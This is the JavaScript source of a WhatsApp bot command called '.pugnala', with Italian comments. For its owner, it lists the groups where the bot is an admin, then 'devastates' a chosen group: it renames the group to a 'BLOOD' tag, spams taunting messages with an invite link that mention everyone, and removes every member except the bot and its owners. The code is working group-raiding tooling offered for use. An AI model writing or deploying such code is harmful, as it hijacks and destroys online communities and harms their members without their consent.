let handler = async (m, { conn, text, isBotAdmin }) => {
    // LOG DI DEBUG - Apparirà nella console quando scrivi il comando
    console.log(`[DEBUG] Comando .pugnala ricevuto da: ${m.sender} in chat: ${m.chat}`);

    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    
    // Controllo manuale dell'owner
    if (!ownerJids.includes(m.sender)) {
        console.log("[DEBUG] Utente non autorizzato (non è owner).");
        return;
    }

    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';

    // --- LOGICA CHAT PRIVATA ---
    if (!m.isGroup) {
        if (!text) {
            await m.reply("⏳ Scansione gruppi in corso...");
            
            let groups = await conn.groupFetchAllParticipating();
            let adminGroups = [];

            for (let id in groups) {
                try {
                    let meta = await conn.groupMetadata(id);
                    let bot = meta.participants.find(p => p.id === botId);
                    if (bot && (bot.admin === 'admin' || bot.admin === 'superadmin')) {
                        adminGroups.push(meta);
                    }
                } catch (e) { continue; }
            }

            if (adminGroups.length === 0) return m.reply("❌ Non sono admin in nessun gruppo.");

            let txt = "🩸 *𝐋𝐈𝐒𝐓𝐀 𝐁𝐄𝐑𝐒𝐀𝐆𝐋𝐈 𝐁𝐋𝐎𝐎𝐃* 🩸\n\n";
            adminGroups.forEach((g, i) => {
                txt += `*${i + 1}.* ${g.subject}\nID: \`${g.id}\`\n\n`;
            });
            txt += "Copia l'ID e usa: `.pugnala <ID>`";
            return m.reply(txt);
        }

        // Se l'utente specifica un ID
        let targetGroup = text.trim();
        try {
            let meta = await conn.groupMetadata(targetGroup);
            await m.reply(`⚔️ Avvio devastazione in: *${meta.subject}*`);
            await executeDevasto(conn, targetGroup, meta.participants, botId, ownerJids);
        } catch (e) {
            return m.reply("❌ ID non valido o gruppo inaccessibile.");
        }
        return;
    }

    // --- LOGICA GRUPPO ---
    if (!isBotAdmin) return m.reply("❌ Devo essere admin.");
    let metadata = await conn.groupMetadata(m.chat);
    await executeDevasto(conn, m.chat, metadata.participants, botId, ownerJids);
};

async function executeDevasto(conn, chatId, participants, botId, ownerJids) {
    try {
        // Cambio nome
        await conn.groupUpdateSubject(chatId, `𝚂𝚅𝚃 𝙱𝚢 𝐁𝐋𝐎𝐎𝐃`);

        let usersToRemove = participants
            .map(p => p.id || p.jid)
            .filter(jid => jid && jid !== botId && !ownerJids.includes(jid));

        // Messaggi
        await conn.sendMessage(chatId, { text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭𝐨... 𝐃𝐄𝐕𝐀𝐒𝐓𝐎." });
        await conn.sendMessage(chatId, { 
            text: "𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥' 𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐬𝐭𝐚𝐭𝐢 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐢 𝐝𝐚 𝐁𝐥𝐨𝐨𝐝.\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri",
            mentions: participants.map(p => p.id || p.jid)
        });

        // Rimozione
        for (let user of usersToRemove) {
            await conn.groupParticipantsUpdate(chatId, [user], 'remove');
        }
    } catch (e) {
        console.error("Errore devasto:", e);
    }
}

handler.command = ['pugnala'];
// IMPORTANTE: Non mettere handler.group o handler.owner qui se vuoi gestire tutto internamente
// in modo che il bot risponda sempre e tu possa vedere i log di debug.

export default handler;
